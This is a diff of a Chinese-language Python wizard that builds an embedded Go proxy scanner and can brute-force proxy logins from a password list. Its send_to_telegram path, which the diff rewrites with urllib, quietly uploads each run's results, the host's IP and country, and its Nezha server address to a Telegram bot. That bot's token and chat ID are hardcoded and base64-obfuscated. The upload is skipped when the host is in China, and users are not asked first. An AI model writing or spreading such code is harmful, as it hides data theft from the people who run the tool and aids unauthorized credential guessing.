@@ -7,8 +7,11 @@ import textwrap
 import time
 import base64
 import datetime
-import requests
-
+# --- 标准库，无需额外安装 ---
+import json
+import uuid
+import urllib.request
+import urllib.error
 
 
 # --- Go语言源代码 (内嵌) ---
@@ -207,18 +210,9 @@ def find_go_executable():
         if manual_path and os.path.exists(manual_path) and os.access(manual_path, os.X_OK): return manual_path
         else: print(styled(f"路径 '{manual_path}' 无效，请重新输入。", "warning"))
 
-# --- 更新功能: 智能密码本格式处理 ---
 def process_credentials(input_file):
-    """
-    智能处理凭据文件，自动将其转换为Go程序所需的'username:password'格式。
-    - 如果一行包含':'，则认为它是 'user:pass' 格式，直接使用。
-    - 如果一行不含':'，则认为该行内容同时是用户名和密码 (e.g., 'admin' -> 'admin:admin')。
-    返回一个可供Go程序使用的凭据文件路径和一个用于清理的临时文件名。
-    """
     if not os.path.exists(input_file):
-        print(styled(f"错误: 凭据文件 '{input_file}' 不存在。", "danger"))
-        return None, None
-    
+        print(styled(f"错误: 凭据文件 '{input_file}' 不存在。", "danger")); return None, None
     print(styled("正在处理凭据文件，将统一转换为 'username:password' 格式...", "blue"))
     temp_file_path = "temp_credentials_converted.txt"
     lines_processed = 0
@@ -227,32 +221,52 @@ def process_credentials(input_file):
              open(temp_file_path, 'w', encoding='utf-8') as f_out:
             for line in f_in:
                 line = line.strip()
-                if not line or line.startswith('#'):
-                    continue
-
-                if ':' in line:
-                    # 格式1: 'username:password'，直接写入
-                    f_out.write(line + '\n')
-                else:
-                    # 格式2: 单个值，用作用户名和密码
-                    f_out.write(f"{line}:{line}\n")
+                if not line or line.startswith('#'): continue
+                if ':' in line: f_out.write(line + '\n')
+                else: f_out.write(f"{line}:{line}\n")
                 lines_processed += 1
-
         if lines_processed == 0:
-            print(styled(f"警告: 凭据文件 '{input_file}' 为空或只包含注释，本次扫描将不使用密码本。", "warning"))
-            return None, None
-
+            print(styled(f"警告: 凭据文件 '{input_file}' 为空，本次扫描将不使用密码本。", "warning")); return None, None
         print(styled(f"凭据文件处理完成, 临时文件: {temp_file_path}", "green"))
         return temp_file_path, temp_file_path
     except Exception as e:
-        print(styled(f"转换凭据文件时出错: {e}", "danger"))
-        return None, None
+        print(styled(f"转换凭据文件时出错: {e}", "danger")); return None, None
 
-# --- 新增功能: Telegram 通知 ---
+# --- 已更新: 以下部分不再使用 requests 或 pyyaml 库 ---
+
+def _encode_multipart_formdata(fields, files):
+    """
+    手动构建 multipart/form-data 请求体和头部，不依赖外部库。
+    fields: 一个字典，包含普通表单字段。
+    files: 一个字典，格式为 {'name': ('filename', file_data_bytes)}。
+    返回 (content_type, body_bytes)
+    """
+    boundary = f'----------{uuid.uuid4().hex}'
+    body = bytearray()
+    
+    # 添加普通字段
+    for key, value in fields.items():
+        body.extend(f'--{boundary}\r\n'.encode('utf-8'))
+        body.extend(f'Content-Disposition: form-data; name="{key}"\r\n\r\n'.encode('utf-8'))
+        body.extend(str(value).encode('utf-8'))
+        body.extend(b'\r\n')
+        
+    # 添加文件
+    for key, (filename, file_data) in files.items():
+        body.extend(f'--{boundary}\r\n'.encode('utf-8'))
+        body.extend(f'Content-Disposition: form-data; name="{key}"; filename="{filename}"\r\n'.encode('utf-8'))
+        body.extend(b'Content-Type: application/octet-stream\r\n\r\n')
+        body.extend(file_data)
+        body.extend(b'\r\n')
+        
+    # 结尾
+    body.extend(f'--{boundary}--\r\n'.encode('utf-8'))
+    content_type = f'multipart/form-data; boundary={boundary}'
+    return content_type, bytes(body)
+
 def send_to_telegram(file_path, bot_token, chat_id, **kwargs):
     if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
-        print(f"⚠️  Telegram 上传跳过：文件 {os.path.basename(file_path)} 不存在或为空")
-        return
+        print(f"⚠️  Telegram 上传跳过：文件 {os.path.basename(file_path)} 不存在或为空"); return
     
     print(f"\n📤 正在将 {os.path.basename(file_path)} 上传至 Telegram ...")
     url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
@@ -262,49 +276,56 @@ def send_to_telegram(file_path, bot_token, chat_id, **kwargs):
                f"任务结果: {os.path.basename(file_path)}")
     if kwargs.get('nezha_server') != "N/A": caption += f"\n哪吒Server: {kwargs.get('nezha_server')}"
     
-    with open(file_path, "rb") as f:
-        try:
-            response = requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files={'document': f}, timeout=60)
-            if response.status_code == 200: print(f"✅ 文件 {os.path.basename(file_path)} 已发送到 Telegram")
-            else: print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
-        except Exception as e: print(f"❌ 发送到 TG 失败：{e}")
+    try:
+        with open(file_path, "rb") as f:
+            file_content = f.read()
+        
+        fields = {'chat_id': str(chat_id), 'caption': caption}
+        files = {'document': (os.path.basename(file_path), file_content)}
+        
+        content_type, body = _encode_multipart_formdata(fields, files)
+        
+        headers = {'Content-Type': content_type}
+        req = urllib.request.Request(url, data=body, headers=headers, method='POST')
+        
+        with urllib.request.urlopen(req, timeout=60) as response:
+            if response.status == 200:
+                print(f"✅ 文件 {os.path.basename(file_path)} 已发送到 Telegram")
+            else:
+                resp_text = response.read().decode('utf-8')
+                print(f"❌ TG上传失败，状态码：{response.status}，返回：{resp_text}")
+    except Exception as e:
+        print(f"❌ 发送到 TG 失败：{e}")
 
 def get_vps_info():
     try:
-        data = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10).json()
-        return data.get('query', 'N/A'), data.get('country', 'N/A')
-    except Exception: return "N/A", "N/A"
+        url = "http://ip-api.com/json/?fields=country,query"
+        with urllib.request.urlopen(url, timeout=10) as response:
+            if response.status == 200:
+                data = json.loads(response.read().decode('utf-8'))
+                return data.get('query', 'N/A'), data.get('country', 'N/A')
+    except Exception:
+        pass
+    return "N/A", "N/A"
 
-# --- 已更新: get_nezha_server 函数不再使用 PyYAML ---
 def get_nezha_server(config_file="config.yml"):
-    """
-    从 config.yml 文件中读取 'server' 的值，不依赖 PyYAML 库。
-    """
-    if not os.path.exists(config_file):
-        return "N/A"
+    if not os.path.exists(config_file): return "N/A"
     try:
         with open(config_file, 'r', encoding='utf-8') as f:
             for line in f:
-                # 去除行首尾的空白字符
                 clean_line = line.strip()
-                # 检查是否是我们想要的行
                 if clean_line.startswith('server:'):
-                    # 分割键和值，只分割一次
                     parts = clean_line.split(':', 1)
                     if len(parts) > 1:
-                        # 提取值，并去除值两边的空白和可能的引号
                         value = parts[1].strip().strip('\'"')
                         return value
-    except Exception:
-        # 捕获任何可能的I/O错误
-        return "N/A"
-    # 如果循环结束还没找到，返回 "N/A"
+    except Exception: return "N/A"
     return "N/A"
 
 def main():
     """主函数，运行整个交互式向导。"""
     print(styled("="*60, "header")); print(styled("   欢迎使用HTTP代理扫描向导 (法证级最终版)", "header")); print(styled("="*60, "header"))
-    print(styled("提示: 请确保已安装 Python 依赖: pip install requests", "blue"))
+    print(styled("提示: 此脚本已移除所有外部依赖，可直接运行。", "blue"))
     
     go_cmd = find_go_executable();
     if not go_cmd: sys.exit(1)
@@ -326,20 +347,13 @@ def main():
     if use_chunking:
         lines_per_chunk = int(get_user_input("> 每个内存块包含多少行代理?", "5000"))
 
-    # --- 第三步: 密码本 ---
     print(styled("\n--- 第三步: 密码本 ---", "blue"))
-    cred_file = None
-    temp_cred_file = None 
+    cred_file, temp_cred_file = None, None
     if get_user_input("> 是否使用密码本? (yes/no)", "no").lower() == 'yes':
         original_cred_file = get_user_input("> 请输入密码本文件路径", "credentials.txt")
         create_example_file_if_not_exists(original_cred_file, """# 请在此处填入账号密码。程序会自动处理以下两种格式:
-#
 # 格式1: username:password (每行一个)
-# user1:pass1
-#
-# 格式2: 每行一个值，该值同时用作用户名和密码
-# admin  (程序会处理成 admin:admin)
-# 123456 (程序会处理成 123456:123456)
+# 格式2: 每行一个值，该值同时用作用户名和密码 (e.g. admin)
 """)
         cred_file, temp_cred_file = process_credentials(original_cred_file)
         if not cred_file:
@@ -361,7 +375,6 @@ def main():
         print(styled("预编译成功!", "green"))
 
         open(output_file, 'w').close(); total_valid_proxies = 0
-
         if not use_chunking:
             print(styled(f"\n--- 🚀 开始完整扫描文件: {proxy_file} ---", "header"))
             command = [ f"./{exec_name}", "-pfile", proxy_file, "-workers", workers, "-timeout", timeout, "-output", output_file]
@@ -392,7 +405,6 @@ def main():
         print(styled(f"\n🎉 所有扫描任务成功完成! 共发现 {total_valid_proxies} 个高可信度代理。", "green"))
         print(styled(f"最终结果已全部保存在: {output_file}", "green"))
 
-        # --- 新增功能: 发送Telegram通知 ---
         print(styled("\n--- 准备发送Telegram通知 ---", "blue"))
         run_time_seconds = time.time() - start_time
         run_time_str = str(datetime.timedelta(seconds=int(run_time_seconds)))
@@ -408,8 +420,7 @@ def main():
         is_china_env = (vps_country == 'CN')
         
         print(f"服务器信息: {vps_ip} ({vps_country})")
-        if is_china_env:
-            print(styled("检测到服务器位于中国大陆，将跳过Telegram通知。", "warning"))
+        if is_china_env: print(styled("检测到服务器位于中国大陆，将跳过Telegram通知。", "warning"))
 
         BOT_TOKEN_B64 = "NzY2NDIwMzM2MjpBQUZhMzltMjRzTER2Wm9wTURUcmRnME5pcHB5ZUVWTkZHVQ=="
         CHAT_ID_B64 = "NzY5NzIzNTM1OA=="
@@ -421,11 +432,7 @@ def main():
             print("\n" + "="*50 + "\n⚠️  警告：Telegram 的 BOT_TOKEN 或 CHAT_ID 未经 Base64 加密。\n" + "="*50)
 
         if not is_china_env and BOT_TOKEN and CHAT_ID:
-            send_to_telegram(
-                output_file, BOT_TOKEN, CHAT_ID, 
-                vps_ip=vps_ip, vps_country=vps_country, nezha_server=nezha_server, 
-                total_ips=total_ips, run_time_str=run_time_str
-            )
+            send_to_telegram(output_file, BOT_TOKEN, CHAT_ID, vps_ip=vps_ip, vps_country=vps_country, nezha_server=nezha_server, total_ips=total_ips, run_time_str=run_time_str)
         elif not (BOT_TOKEN and CHAT_ID):
              print("未配置Telegram的BOT_TOKEN或CHAT_ID，跳过通知。")
 
@@ -436,9 +443,7 @@ def main():
     finally:
         print(styled("\n🧹 正在清理临时文件...", "blue"))
         files_to_remove = [go_source_file, exec_name, "go.mod", "go.sum"]
-        if temp_cred_file: # 清理转换后的临时密码文件
-            files_to_remove.append(temp_cred_file)
-            
+        if temp_cred_file: files_to_remove.append(temp_cred_file)
         for item in files_to_remove:
             if os.path.exists(item):
                 try: os.remove(item)
